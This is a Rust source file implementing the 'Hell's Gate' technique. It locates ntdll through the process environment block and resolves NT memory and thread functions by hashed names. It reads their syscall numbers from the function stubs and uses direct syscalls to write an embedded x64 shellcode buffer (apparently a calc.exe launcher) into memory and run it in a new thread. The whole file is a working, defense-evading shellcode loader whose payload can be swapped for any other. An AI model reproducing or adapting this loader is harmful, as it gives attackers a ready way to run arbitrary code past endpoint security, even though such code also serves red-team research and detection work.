use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpebteb::{PTEB, TEB},
};
use std::{ffi::CStr};
use std::ptr::null_mut;

use winapi::{
    ctypes::c_void,
    shared::{
        ntdef::{NTSTATUS, PVOID},
    },
    um::{
        processthreadsapi::GetCurrentProcess,
        winnt::{
            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS,
            IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
            THREAD_ALL_ACCESS,
        },
    },
};

// pub type ULONG_PTR = usize;
// pub type PSIZE_T = *mut ULONG_PTR;
// pub type HANDLE = *mut c_void;
// pub type PVOID = *mut c_void;

const NT_ALLOCATE_VIRTUAL_MEMORY_DJB2: u64 = 0x7B2D1D431C81F5F6;
const NT_WRITE_VIRTUAL_MEMORY_DJB2: u64 = 0x54AEE238645CCA7C;
const NT_PROTECT_VIRTUAL_MEMORY_DJB2: u64 = 0xA0DCC2851566E832;
const NT_CREATE_THREAD_EX_DJB2: u64 = 0x2786FB7E75145F1A;

const BUFFER: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

struct VxTableEntry {
    paddress: *mut c_void,
    dwhash: u64,
    wsystemcall: u16,
}

struct VxTable {
    nt_allocate_virtual_memory: VxTableEntry,
    nt_write_virtual_memory: VxTableEntry,
    nt_protect_virtual_memory: VxTableEntry,
    nt_create_thread_ex: VxTableEntry
}

// fn hells_gate(w_system_call: u16) {
//     unsafe {
//         WSYSCALL = w_system_call as u32;
//     }
// }

// unsafe fn hell_descent(
//     arg1: *mut c_void,
//     arg2: *mut c_void,
//     arg3: *mut c_void,
//     arg4: *mut c_void,
//     _arg5: *mut c_void,
//     _arg6: *mut c_void,
//     _arg7: *mut c_void,
//     _arg8: *mut c_void,
//     _arg9: *mut c_void,
//     _arg10: *mut c_void,
//     _arg11: *mut c_void,
// ) -> NTSTATUS {
//     unsafe {
//         let result: i32;
//         std::arch::asm!(
//             "mov r10, rcx",
//             "mov eax, [rip + {0}]",
//             "syscall",
//             sym WSYSCALL,
//             out("rax") result,
//             in("rcx") arg1,
//             in("rdx") arg2,
//             in("r8") arg3,
//             in("r9") arg4,
//             clobber_abi("sysv64"),
//         );
//         result as NTSTATUS
//     }
// }

unsafe extern "C" {
    fn HellsGate(w_system_call: u16);
    fn HellDescent(
        arg1: *mut c_void,
        arg2: *mut c_void,
        arg3: *mut c_void,
        arg4: *mut c_void,
        arg5: *mut c_void,
        arg6: *mut c_void,
        arg7: *mut c_void,
        arg8: *mut c_void,
        arg9: *mut c_void,
        arg10: *mut c_void,
        arg11: *mut c_void,
    ) -> NTSTATUS;
}

fn djb2_hash(input: &[u8]) -> u64 {
    let mut hash: u64 = 0x77347734DEADBEEF;

    for byte in input {
        hash = (hash << 5).wrapping_add(hash).wrapping_add(*byte as u64);
    }

    hash
}

fn rtl_get_current_teb() -> PTEB {
    unsafe {
        let mut teb: *mut TEB = null_mut();
        #[cfg(target_arch = "x86_64")]
        {
            std::arch::asm!(
                "mov {}, gs:[0x30]",
                out(reg) teb
            );
        }
        #[cfg(target_arch = "x86")]
        {
            std::arch::asm!(
                "mov {}, fs:[0x18]",
                out(reg) teb
            );
        }
        teb as PTEB
    }
}

fn get_image_export_directory(
    module_base: *mut c_void,
    image_export_directory: *mut *mut IMAGE_EXPORT_DIRECTORY,
) -> bool {
    unsafe {
        let dos_header = module_base as *const IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS header");
            return false;
        }

        let nt_headers = (module_base as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS;
        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT headers");
            return false;
        }

        *image_export_directory = (module_base as *const u8)
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *mut IMAGE_EXPORT_DIRECTORY;
        true
    }
}

fn get_vx_table_entry(
    module_base: *mut c_void,
    export_directory: *const IMAGE_EXPORT_DIRECTORY,
    vx_entry: &mut VxTableEntry,
) -> bool {
    unsafe {
        let address_of_functions = (module_base as *const u8)
            .add((*export_directory).AddressOfFunctions as usize)
            as *const u32;
        let address_of_names = (module_base as *const u8)
            .add((*export_directory).AddressOfNames as usize)
            as *const u32;
        let address_of_name_ordinals = (module_base as *const u8)
            .add((*export_directory).AddressOfNameOrdinals as usize)
            as *const u16;

        for cx in 0..(*export_directory).NumberOfFunctions as isize {
            let function_name =
                (module_base as *const u8).add(*address_of_names.offset(cx) as usize) as *const i8;

            // Get the ordinal (16-bit WORD)
            let ordinal = *address_of_name_ordinals.offset(cx) as usize;

            // bounds check
            if ordinal >= (*export_directory).NumberOfFunctions as usize {
                continue;
            }

            // Get the RVA from the functions array using the ordinal as index
            let function_rva = *address_of_functions.add(ordinal);
            let function_address = (module_base as *const u8).add(function_rva as usize);

            let c_str = CStr::from_ptr(function_name);
            if let Ok(function_str) = c_str.to_str() {
                // println!("[FunctionName] {} - [Hash]: 0x{:X}", function_str, djb2_hash(function_str.as_bytes()));
                if djb2_hash(function_str.as_bytes()) == vx_entry.dwhash {
                    vx_entry.paddress = function_address as *mut c_void;

                    let mut cw = 0;
                    loop {
                        let bytes = function_address as *const u8;
                        if *bytes.offset(cw) == 0x0F && *bytes.offset(cw + 1) == 0x05 {
                            return false;
                        }
                        if *bytes.offset(cw) == 0xC3 {
                            return false;
                        }

                        if *bytes.offset(cw) == 0x4C
                            && *bytes.offset(cw + 1) == 0x8B
                            && *bytes.offset(cw + 2) == 0xD1
                            && *bytes.offset(cw + 3) == 0xB8
                            && *bytes.offset(cw + 6) == 0x00
                            && *bytes.offset(cw + 7) == 0x00
                        {
                            let low = *bytes.offset(cw + 4);
                            let high = *bytes.offset(cw + 5);
                            vx_entry.wsystemcall = ((high as u16) << 8) | low as u16;
                            break;
                        }
                        cw += 1;
                    }
                    return true;
                }
            }
        }
        true
    }
}

fn inject_shellcode(
    pvxtable: &VxTable,
    h_process: *mut c_void,
    payload: &[u8],
    payload_size: usize,
) -> bool {
    unsafe {
        let mut paddress: *mut c_void = null_mut();
        let mut old_protection: u32 = 0;
        let mut size = payload_size;
        let mut number_of_bytes_written: usize = 0;
        let mut h_thread: *mut c_void = null_mut();

        // Call NtAllocateVirtualMemory with the correct syscall number
        HellsGate(pvxtable.nt_allocate_virtual_memory.wsystemcall);
        let status = HellDescent(
            h_process,
            &mut paddress as *mut PVOID as *mut c_void,
            null_mut(),
            &mut size as *mut usize as *mut c_void,
            (MEM_RESERVE | MEM_COMMIT) as *mut c_void,
            PAGE_READWRITE as *mut c_void,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
        );

        if status != 0 {
            println!("[-] NtAllocateVirtualMemory failed: 0x{:X}", status);
            return false;
        }

        println!(
            "[+] Allocated memory at {:p} of size {} bytes",
            paddress, size
        );

        HellsGate(pvxtable.nt_write_virtual_memory.wsystemcall);
        let status = HellDescent(
            h_process,
            paddress,
            payload.as_ptr() as *mut c_void,
            payload_size as *mut c_void,
            &mut number_of_bytes_written as *mut usize as *mut c_void,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
        );
        if status != 0 {
            println!("[-] NtWriteVirtualMemory failed: 0x{:X}", status);
            return false;
        }

        println!(
            "[+] Written {} bytes to target process",
            number_of_bytes_written
        );

        HellsGate(pvxtable.nt_protect_virtual_memory.wsystemcall);
        let status = HellDescent(
            h_process,
            &mut paddress as *mut PVOID as *mut c_void,
            &mut size as *mut usize as *mut c_void,
            PAGE_EXECUTE_READ as *mut c_void,
            &mut old_protection as *mut u32 as *mut c_void,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
        );
        if status != 0 {
            println!("[-] NtProtectVirtualMemory failed: 0x{:X}", status);
            return false;
        }

        HellsGate(pvxtable.nt_create_thread_ex.wsystemcall);
        let status = HellDescent(
            &mut h_thread as *mut *mut c_void as *mut c_void,
            THREAD_ALL_ACCESS as *mut c_void,
            null_mut(),
            h_process,
            paddress,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
        );

        if status != 0 {
            println!("[-] NtCreateThreadEx failed: 0x{:X}", status);
            return false;
        }


    }

    true
}

fn pause() {
    println!("Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    unsafe {
        let current_teb = rtl_get_current_teb();
        let current_peb = (*current_teb).ProcessEnvironmentBlock;

        if current_peb.is_null() || current_teb.is_null() || (*current_peb).OSMajorVersion != 0xA {
            println!("[-] Invalid PEB");
            return;
        }

        let ldr_data_entry = ((*(*(*current_peb).Ldr).InMemoryOrderModuleList.Flink).Flink
            as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;

        let ntdll_base = (*ldr_data_entry).DllBase;
        println!("[+] ntdll.dll base address: {:p}", ntdll_base);

        let mut export_directory: *mut IMAGE_EXPORT_DIRECTORY = null_mut();
        if !get_image_export_directory(ntdll_base, &mut export_directory) {
            println!("[-] Failed to get export directory");
            return;
        }

        let mut table = VxTable {
            nt_allocate_virtual_memory: VxTableEntry {
                paddress: null_mut(),
                dwhash: NT_ALLOCATE_VIRTUAL_MEMORY_DJB2,
                wsystemcall: 0,
            },
            nt_write_virtual_memory: VxTableEntry {
                paddress: null_mut(),
                dwhash: NT_WRITE_VIRTUAL_MEMORY_DJB2,
                wsystemcall: 0,
            },
            nt_protect_virtual_memory: VxTableEntry {
                paddress: null_mut(),
                dwhash: NT_PROTECT_VIRTUAL_MEMORY_DJB2,
                wsystemcall: 0,
            },
            nt_create_thread_ex: VxTableEntry {
                paddress: null_mut(),
                dwhash: NT_CREATE_THREAD_EX_DJB2,
                wsystemcall: 0,
            }
        };

        if !get_vx_table_entry(
            ntdll_base,
            export_directory,
            &mut table.nt_allocate_virtual_memory,
        ) || !get_vx_table_entry(
            ntdll_base,
            export_directory,
            &mut table.nt_write_virtual_memory,
        ) || !get_vx_table_entry(
            ntdll_base,
            export_directory,
            &mut table.nt_protect_virtual_memory,
        ) || !get_vx_table_entry(
            ntdll_base, 
            export_directory, 
            &mut table.nt_create_thread_ex
        ) {
            println!("[-] Failed to get VX table entries");
            return;
        }

        if !inject_shellcode(&table, GetCurrentProcess(), BUFFER, BUFFER.len()) {
            println!("[-] Shellcode injection failed");
            return;
        }

        pause();
    }
}
